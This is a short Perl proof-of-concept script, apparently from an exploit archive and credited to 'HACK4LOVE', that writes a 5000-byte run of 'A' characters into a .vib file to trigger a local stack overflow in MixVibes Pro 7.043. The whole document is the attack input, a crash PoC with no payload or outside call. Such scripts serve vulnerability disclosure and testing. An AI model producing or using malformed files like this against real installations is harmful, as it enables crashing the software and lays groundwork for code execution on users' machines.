#!/usr/bin/perl
# Found By :: HACK4LOVE
# MixVibes Pro 7.043 (.vib File) Local Stack Overflow PoC
# http://www.softpedia.com/progDownload/MixVibes-Pro-Download-3074.html
########################################################################################
my $crash="\x41" x 5000;
open(myfile,'>>hack4love.vib');
print myfile $crash;
########################################################################################